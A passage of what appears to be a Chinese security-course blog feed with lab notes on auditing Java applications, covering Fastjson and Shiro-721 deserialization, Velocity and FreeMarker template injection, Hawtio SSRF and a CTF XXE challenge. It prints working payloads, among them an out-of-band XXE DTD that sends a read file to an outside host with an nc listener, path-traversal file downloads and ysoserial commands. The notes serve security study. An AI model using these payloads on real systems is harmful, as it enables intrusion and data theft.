id="关键字：JSON-parse-和-JSON-parseObject"><a href="#关键字：JSON-parse-和-JSON-parseObject" class="headerlink" title="关键字：JSON.parse() 和 JSON.parseObject()"></a>关键字：JSON.parse() 和 JSON.parseObject()</h5><h5 id="payload-“-type”-”java-net-Inet4Address”-”val”-”sppj9z-dnslog-cn”-（java自带的库）"><a href="#payload-“-type”-”java-net-Inet4Address”-”val”-”sppj9z-dnslog-cn”-（java自带的库）" class="headerlink" title="payload:{“@type”:”java.net.Inet4Address”,”val”:”sppj9z.dnslog.cn”}（java自带的库）"></a>payload:{“@type”:”java.net.Inet4Address”,”val”:”sppj9z.dnslog.cn”}（java自带的库）</h5><h6 id="是存在漏洞的版本"><a href="#是存在漏洞的版本" class="headerlink" title="是存在漏洞的版本"></a>是存在漏洞的版本</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413125455552.png" alt="image-20230413125455552"></p><h6 id="jndi-注入工具开启服务："><a href="#jndi-注入工具开启服务：" class="headerlink" title="jndi 注入工具开启服务："></a>jndi 注入工具开启服务：</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413130448314.png" alt="image-20230413130448314"></p><h6 id="所有测试的payload，但不是所有的都能成功，因为有的是引用第三方库，可能它没有引用，但是可以利用java自带的库的payload"><a href="#所有测试的payload，但不是所有的都能成功，因为有的是引用第三方库，可能它没有引用，但是可以利用java自带的库的payload" class="headerlink" title="所有测试的payload，但不是所有的都能成功，因为有的是引用第三方库，可能它没有引用，但是可以利用java自带的库的payload"></a>所有测试的payload，但不是所有的都能成功，因为有的是引用第三方库，可能它没有引用，但是可以利用java自带的库的payload</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413131026151.png" alt="image-20230413131026151"></p><h5 id="2、JSPXCMS-Shiro721"><a href="#2、JSPXCMS-Shiro721" class="headerlink" title="2、JSPXCMS Shiro721"></a>2、JSPXCMS Shiro721</h5><p><a href="https://blog.csdn.net/m0_55793759/article/details/129398462">(23条消息) Shiro 550与721漏洞的不同_迷途羔羊pro的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_45682070/article/details/108150265">(23条消息) shiro反序列化漏洞复现_XiaoLeiZhaoO的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_49849300/article/details/129436231">(23条消息) shiro反序列化漏洞学习（工具+原理+复现）_shiro反序列化工具_FR0-1的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/106475088">(23条消息) Shiro反序列化漏洞_shiro反序列化漏洞危害_風月长情的博客-CSDN博客</a></p><p><a href="https://juejin.cn/post/7133959651653058574#heading-12">Shiro反序列化漏洞利用详解（Shiro-550+Shiro-721） - 掘金 (juejin.cn)</a></p><p><a href="https://www.cnblogs.com/qianxinggz/p/13388405.html">shiro721复现 - qianxinggz - 博客园 (cnblogs.com)</a></p><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413131711182.png" alt="image-20230413131711182"></p><h6 id="先通过pom-xml发现引用包里面存在shiro框架的漏洞版本"><a href="#先通过pom-xml发现引用包里面存在shiro框架的漏洞版本" class="headerlink" title="先通过pom.xml发现引用包里面存在shiro框架的漏洞版本"></a>先通过pom.xml发现引用包里面存在shiro框架的漏洞版本</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413133020446.png" alt="image-20230413133020446"></p><h6 id="通过网上搜索查到这个存在此反序列化漏洞"><a href="#通过网上搜索查到这个存在此反序列化漏洞" class="headerlink" title="通过网上搜索查到这个存在此反序列化漏洞"></a>通过网上搜索查到这个存在此反序列化漏洞</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413133107670.png" alt="image-20230413133107670"></p><h6 id="爆破密钥key"><a href="#爆破密钥key" class="headerlink" title="爆破密钥key"></a>爆破密钥key</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413133716307.png" alt="image-20230413133716307"></p><h6 id="利用，修改remenberMe的值为生成的payload"><a href="#利用，修改remenberMe的值为生成的payload" class="headerlink" title="利用，修改remenberMe的值为生成的payload"></a>利用，修改remenberMe的值为生成的payload</h6><p><img src="/../images/Day94-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413133524769.png" alt="image-20230413133524769"></p><blockquote><h5 id="执行命令："><a href="#执行命令：" class="headerlink" title="执行命令："></a>执行命令：</h5><h6 id="1、java-jar-ysoserial-jar-CommonsBeanutils1-“calc”-gt-payload-class"><a href="#1、java-jar-ysoserial-jar-CommonsBeanutils1-“calc”-gt-payload-class" class="headerlink" title="1、java -jar ysoserial.jar CommonsBeanutils1 “calc” &gt; payload.class"></a>1、java -jar ysoserial.jar CommonsBeanutils1 “calc” &gt; payload.class</h6><h6 id="2、python2-shiro-exp-py-http-192-168-1-8-8080-Rememberme-cookie-payload-class"><a href="#2、python2-shiro-exp-py-http-192-168-1-8-8080-Rememberme-cookie-payload-class" class="headerlink" title="2、python2 shiro_exp.py http://192.168.1.8:8080/ Rememberme_cookie payload.class"></a>2、python2 shiro_exp.py <a href="http://192.168.1.8:8080/">http://192.168.1.8:8080/</a> Rememberme_cookie payload.class</h6></blockquote><p><code>GET / HTTP/1.1</code></p><p><code>Host: 192.168.1.8:8080</code></p><p><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</code></p><p><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</code></p><p><code>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</code></p><p><code>Accept-Encoding: gzip, deflate</code></p><p><code>DNT: 1</code></p><p><code>Cookie: JSESSIONID=72FE3213457D9CA35FBDF110378DE26C; _jspxcms=ebdad749ee03403fa0b3851385a06037;rememberMe=xxxxxxxxxxx</code></p><p><code>Connection: close</code></p><p><code>Upgrade-Insecure-Requests: 1</code></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day93 代码审计-Java项目&amp;SSTI&amp;SSRF&amp;XXE&amp;XML&amp;CNVD模版&amp;CTF组件</title>
      <link href="/2023/04/11/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/"/>
      <url>/2023/04/11/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Java-配置-模版配合&amp;RCE</p><p>2、Java-配置-第三方框架组件</p><p>3、Java-代审-SSTI&amp;SSRF&amp;XXE</p><h3 id="Java审计知识点："><a href="#Java审计知识点：" class="headerlink" title="#Java审计知识点："></a>#Java审计知识点：</h3><p><a href="https://xz.aliyun.com/t/7945">java代码审计 - 先知社区 (aliyun.com)</a>、java代码审计常规思路和方法.pdf</p><p>SQL注入，XSS跨站，RCE执行，反序列化，身份验证，SPEL，SSTI，三方组件安全等</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-Demo-引用-SSTI-amp-SSRF-amp-XXE"><a href="#➢-Demo-引用-SSTI-amp-SSRF-amp-XXE" class="headerlink" title="➢ Demo-引用-SSTI&amp;SSRF&amp;XXE"></a>➢ Demo-引用-SSTI&amp;SSRF&amp;XXE</h4><h4 id="➢-SSTI-OFCMS-模版Freemarker"><a href="#➢-SSTI-OFCMS-模版Freemarker" class="headerlink" title="➢ SSTI-OFCMS-模版Freemarker"></a>➢ SSTI-OFCMS-模版Freemarker</h4><h4 id="➢-SSRF-Hawtio-CVE-2019-9827"><a href="#➢-SSRF-Hawtio-CVE-2019-9827" class="headerlink" title="➢ SSRF-Hawtio-CVE-2019-9827"></a>➢ SSRF-Hawtio-CVE-2019-9827</h4><h4 id="➢-XXE-FileJava-网鼎杯2020青龙组"><a href="#➢-XXE-FileJava-网鼎杯2020青龙组" class="headerlink" title="➢ XXE-FileJava-网鼎杯2020青龙组"></a>➢ XXE-FileJava-网鼎杯2020青龙组</h4></blockquote><h4 id="Demo-引用-SSTI-amp-SSRF-amp-XXE"><a href="#Demo-引用-SSTI-amp-SSRF-amp-XXE" class="headerlink" title="#Demo-引用-SSTI&amp;SSRF&amp;XXE"></a>#Demo-引用-SSTI&amp;SSRF&amp;XXE</h4><p><a href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code</a></p><h5 id="SSTI-velocity"><a href="#SSTI-velocity" class="headerlink" title="SSTI velocity:"></a>SSTI velocity:</h5><h5 id="漏洞成引用库-如Freemarker、Velocity、Thymeleaf等"><a href="#漏洞成引用库-如Freemarker、Velocity、Thymeleaf等" class="headerlink" title="漏洞成引用库:如Freemarker、Velocity、Thymeleaf等"></a>漏洞成引用库:如Freemarker、Velocity、Thymeleaf等</h5><p><a href="http://localhost:8080/java-sec-code-1.0.0/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)">http://localhost:8080/java-sec-code-1.0.0/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)</a></p><h5 id="SSRF-urlConnection-getInputStream"><a href="#SSRF-urlConnection-getInputStream" class="headerlink" title="SSRF urlConnection.getInputStream"></a>SSRF urlConnection.getInputStream</h5><h5 id="可能漏洞成因关键字："><a href="#可能漏洞成因关键字：" class="headerlink" title="可能漏洞成因关键字："></a>可能漏洞成因关键字：</h5><p>urlConnection.getInputStream</p><p>HttpURLConnection.getInputStream</p><p>URLConnection.getInutStream    </p><p>HttpClient.execute</p><p>OkHttpClient.newCall.execute</p><p>Request.Get.execute</p><p>Request.Post.execute</p><p>URL.openStream         </p><p>ImageIO.rea</p><p><a href="http://localhost:8080/java-sec-code-1.0.0/ssrf/urlConnection/vuln?url=file:///d:/e.txt">http://localhost:8080/java-sec-code-1.0.0/ssrf/urlConnection/vuln?url=file:///d:/e.txt</a></p><h5 id="XXE-xlsx-streamer-poi-ooxml"><a href="#XXE-xlsx-streamer-poi-ooxml" class="headerlink" title="XXE  xlsx-streamer poi-ooxml"></a>XXE  xlsx-streamer poi-ooxml</h5><h5 id="可能漏洞成因关键字：-1"><a href="#可能漏洞成因关键字：-1" class="headerlink" title="可能漏洞成因关键字："></a>可能漏洞成因关键字：</h5><p>Documentbuilder|DocumentBuilderFactory|SAXReader|SAXParser|SAXParserFactory|SAXBuilder|TransformerFactory|reqXml|getInputStream|XMLReaderFactory|.newInstance|SchemaFactory|SAXTransformerFactory|javax.xml.bind|XMLReader|XmlUtils.get|Validator</p><p>javax.xml.parsers.DocumentBuilder</p><p>javax.xml.stream.XMLStreamReader</p><p>org.jdom.input.SAXBuilder</p><p>org.jdom2.input.SAXBuilder</p><p>javax.xml.parsers.SAXParser</p><p>org.dom4j.io.SAXReader</p><p>org.xml.sax.XMLReader</p><p>javax.xml.transform.sax.SAXSource</p><p>javax.xml.transform.TransformerFactory</p><p>javax.xml.transform.sax.SAXTransformerFactory</p><p>javax.xml.validation.SchemaFactory</p><p>javax.xml.bind.Unmarshaller</p><p>javax.xml.xpath.XPathExpression</p><p>org.apache.commons.digester3.Digester</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://psh5jr.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="相关链接："><a href="#相关链接：" class="headerlink" title="相关链接："></a>相关链接：</h5><p><a href="https://blog.csdn.net/weixin_50464560/article/details/122814159">(23条消息) 利用EXCEL进行XXE攻击_excel xxe_J0hnson666的博客-CSDN博客</a></p><p>[(23条消息) <a href="https://blog.csdn.net/weixin_57672329/article/details/122068602">20][03][06] Apache POI 安全漏洞(CVE-2019-12415)_poi漏洞_安全新司机的博客-CSDN博客</a></p><h4 id="OFCMS-模版freemarker-SSTI"><a href="#OFCMS-模版freemarker-SSTI" class="headerlink" title="#OFCMS-模版freemarker-SSTI"></a>#OFCMS-模版freemarker-SSTI</h4><p><strong>模板一般都是加载前端界面的，所以存在安全问题可以修改后端的模板内容来实现命令执行</strong></p><p><a href="https://blog.csdn.net/Alexz__/article/details/116400913">(23条消息) 从ofcms的模板注入漏洞（CVE-2019-9614）浅析SSTI漏洞_ofcms漏洞_Alexz__的博客-CSDN博客</a></p><p><img src="/../images/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413090321107.png" alt="image-20230413090321107"></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-08488">https://www.cnvd.org.cn/flaw/show/CNVD-2019-08488</a></p><h5 id="1、pom-xml的时候发现存在模版引擎freemarker"><a href="#1、pom-xml的时候发现存在模版引擎freemarker" class="headerlink" title="1、pom.xml的时候发现存在模版引擎freemarker"></a>1、pom.xml的时候发现存在模版引擎freemarker</h5><p><img src="/../images/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413090740977.png" alt="image-20230413090740977"></p><p><a href="https://www.cnblogs.com/Eleven-Liu/p/12747908.html">FreeMarker模板注入实现远程命令执行 - Eleven_Liu - 博客园 (cnblogs.com)</a></p><p>从源码中可以看到该功能支持freemarker模板文件的热处理，编辑保存等功能</p><h5 id="2、寻找修改模版的地方"><a href="#2、寻找修改模版的地方" class="headerlink" title="2、寻找修改模版的地方"></a>2、寻找修改模版的地方</h5><p><img src="/../images/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413091023537.png" alt="image-20230413091023537"></p><p>TemplateController.java</p><h5 id="3、添加执行Payload"><a href="#3、添加执行Payload" class="headerlink" title="3、添加执行Payload"></a>3、添加执行Payload</h5><h5 id="lt-assign-ex-x3D-”freemarker-template-utility-Execute”-new-gt-ex-“calc”"><a href="#lt-assign-ex-x3D-”freemarker-template-utility-Execute”-new-gt-ex-“calc”" class="headerlink" title="&lt;#assign ex&#x3D;”freemarker.template.utility.Execute”?new()&gt;${ ex(“calc”) }"></a>&lt;#assign ex&#x3D;”freemarker.template.utility.Execute”?new()&gt;${ ex(“calc”) }</h5><h5 id="找到about-html并且添加以上payload"><a href="#找到about-html并且添加以上payload" class="headerlink" title="找到about.html并且添加以上payload"></a>找到about.html并且添加以上payload</h5><p><img src="/../images/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413091155965.png" alt="image-20230413091155965"></p><h4 id="Hawtio-SSRF-CVE-2019-9827"><a href="#Hawtio-SSRF-CVE-2019-9827" class="headerlink" title="#Hawtio-SSRF-CVE-2019-9827"></a>#Hawtio-SSRF-CVE-2019-9827</h4><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2017-29223">https://www.cnvd.org.cn/flaw/show/CNVD-2017-29223</a></p><h5 id="1、ProxyServlet-java-service函数"><a href="#1、ProxyServlet-java-service函数" class="headerlink" title="1、ProxyServlet.java service函数"></a>1、ProxyServlet.java service函数</h5><h5 id="2、通过parseProxyAddress函数获取URL地址-然后判断其是否为空"><a href="#2、通过parseProxyAddress函数获取URL地址-然后判断其是否为空" class="headerlink" title="2、通过parseProxyAddress函数获取URL地址,然后判断其是否为空,"></a>2、通过parseProxyAddress函数获取URL地址,然后判断其是否为空,</h5><h5 id="如果不为空-通过whitelist-isAllowed-判断该URL是否在白名单里，"><a href="#如果不为空-通过whitelist-isAllowed-判断该URL是否在白名单里，" class="headerlink" title="如果不为空,通过whitelist.isAllowed()判断该URL是否在白名单里，"></a>如果不为空,通过whitelist.isAllowed()判断该URL是否在白名单里，</h5><h5 id="3、跟进whitelist-proxyWhitelist"><a href="#3、跟进whitelist-proxyWhitelist" class="headerlink" title="3、跟进whitelist proxyWhitelist"></a>3、跟进whitelist proxyWhitelist</h5><p><a href="http://localhost:8080/hawtio-default-2.4.0/proxy/http://127.0.0.1:8080">http://localhost:8080/hawtio-default-2.4.0/proxy/http://127.0.0.1:8080</a></p><p><img src="/../images/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413103947833.png" alt="image-20230413103947833"></p><h6 id="但是只能探针本地的ip，所以危害并不是很大"><a href="#但是只能探针本地的ip，所以危害并不是很大" class="headerlink" title="但是只能探针本地的ip，所以危害并不是很大"></a>但是只能探针本地的ip，所以危害并不是很大</h6><p><img src="/../images/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413104056923.png" alt="image-20230413104056923"></p><h4 id="filejava-XXE-网鼎杯2020青龙组（poi-ooxml）"><a href="#filejava-XXE-网鼎杯2020青龙组（poi-ooxml）" class="headerlink" title="#filejava-XXE-网鼎杯2020青龙组（poi-ooxml）"></a>#filejava-XXE-网鼎杯2020青龙组（poi-ooxml）</h4><p><strong>提示-下载漏洞-下载配置文件-下载CLASS-代码审计-poi-ooxml操作漏洞</strong></p><p><a href="https://blog.csdn.net/weixin_50464560/article/details/122814159">(23条消息) 利用EXCEL进行XXE攻击_excel xxe_J0hnson666的博客-CSDN博客</a></p><p><img src="/../images/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413093810079.png" alt="image-20230413093810079"></p><h5 id="1、下载："><a href="#1、下载：" class="headerlink" title="1、下载："></a>1、下载：</h5><p>..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml</p><p>..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class</p><p>..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.class</p><p>..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class</p><h5 id="2、审计："><a href="#2、审计：" class="headerlink" title="2、审计："></a>2、审计：</h5><h6 id="利用点1：下载漏洞获取FLAG-过滤"><a href="#利用点1：下载漏洞获取FLAG-过滤" class="headerlink" title="利用点1：下载漏洞获取FLAG-过滤"></a>利用点1：下载漏洞获取FLAG-过滤</h6><h6 id="利用点2：poi-ooxml库漏洞利用-可行"><a href="#利用点2：poi-ooxml库漏洞利用-可行" class="headerlink" title="利用点2：poi-ooxml库漏洞利用-可行"></a>利用点2：poi-ooxml库漏洞利用-可行</h6><p>发现这个版本是存在漏洞的</p><p><img src="/../images/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413093537966.png" alt="image-20230413093537966"></p><h6 id="通过修改xlsx文件压缩后的zip文件里的此个xml文件"><a href="#通过修改xlsx文件压缩后的zip文件里的此个xml文件" class="headerlink" title="通过修改xlsx文件压缩后的zip文件里的此个xml文件"></a>通过修改xlsx文件压缩后的zip文件里的此个xml文件</h6><p><img src="/../images/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413094448087.png" alt="image-20230413094448087"></p><h6 id="通过上传file协议读取etc文件，但是上传之后直接提示上传成功，没有回显内容的，所以考虑带外测试"><a href="#通过上传file协议读取etc文件，但是上传之后直接提示上传成功，没有回显内容的，所以考虑带外测试" class="headerlink" title="通过上传file协议读取etc文件，但是上传之后直接提示上传成功，没有回显内容的，所以考虑带外测试"></a>通过上传file协议读取etc文件，但是上传之后直接提示上传成功，没有回显内容的，所以考虑带外测试</h6><p><img src="/../images/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413094331894.png" alt="image-20230413094331894"></p><h5 id="3、构造："><a href="#3、构造：" class="headerlink" title="3、构造："></a>3、构造：</h5><h6 id="excel-xxxx-xlsx压缩后的xml文件："><a href="#excel-xxxx-xlsx压缩后的xml文件：" class="headerlink" title="excel-xxxx.xlsx压缩后的xml文件："></a><em>excel-xxxx.xlsx</em>压缩后的xml文件：</h6><p><strong>将相关数据发送到“<a href="http://www.abc.com/xxx.dtd%E2%80%9D%E6%96%87%E4%BB%B6%E4%B8%8A%E5%8E%BB%E6%8E%A5%E6%94%B6%E4%BF%A1%E6%81%AF%EF%BC%8C%E7%9B%B8%E5%BD%93%E4%BA%8E%E8%BD%AC%E5%8F%91%EF%BC%8C%E6%8A%8A%E6%95%B0%E6%8D%AE%E5%B8%A6%E5%87%BA%E6%9D%A5%EF%BC%8C%E8%AE%A9http://www.abc.com/xxx.dtd%E5%8E%BB%E6%8E%A5%E6%94%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E6%9D%A5%E7%9A%84%E6%95%B0%E6%8D%AE">http://www.abc.com/xxx.dtd”文件上去接收信息，相当于转发，把数据带出来，让http://www.abc.com/xxx.dtd去接收服务器发来的数据</a></strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">`<span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://www.xiaodi8.com/xxx.dtd&quot;</span>&gt;</span>`</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">`%remote;%int;%send;`</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">`]&gt;</span>`</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413095435242.png" alt="image-20230413095435242"></p><h6 id="xxx-dtd"><a href="#xxx-dtd" class="headerlink" title="xxx.dtd:"></a>xxx.dtd:</h6><p><code>&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</code></p><p><code>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://www.xiaodi8.com:3333/%file;&#39;&gt;&quot;&gt;</code></p><p><code>nc -lvvp 3333</code></p><p><img src="/../images/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413095715887.png" alt="image-20230413095715887"></p><h6 id="上传以后监听到了内容，且读取到了内容"><a href="#上传以后监听到了内容，且读取到了内容" class="headerlink" title="上传以后监听到了内容，且读取到了内容"></a>上传以后监听到了内容，且读取到了内容</h6><p><img src="/../images/Day93-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-SSTI-SSRF-XXE-XML-CNVD%E6%A8%A1%E7%89%88-CTF%E7%BB%84%E4%BB%B6/image-20230413095753443.png" alt="image-20230413095753443"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day92 代码审计-Java项目&amp;框架RCE&amp;表达式注入&amp;SPEL&amp;Log4j&amp;Fastjson</title>
      <link href="/2023/04/11/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/"/>
      <url>/2023/04/11/Day92-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-%E6%A1%86%E6%9E%B6RCE-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-SPEL-Log4j-Fastjson/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Java-配置-Filter过滤器</p><p>2、Java-配置-第三方框架组件</p><p>3、Java-代审-RCE执行&amp;反序列化</p><h3 id="Java审计知识点："><a href="#Java审计知识点：" class="headerlink" title="#Java审计知识点："></a>#Java审计知识点：</h3><p>SQL注入，XSS跨站，RCE执行，反序列化，身份验证，SPEL，SSTI，三方组件安全等</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" 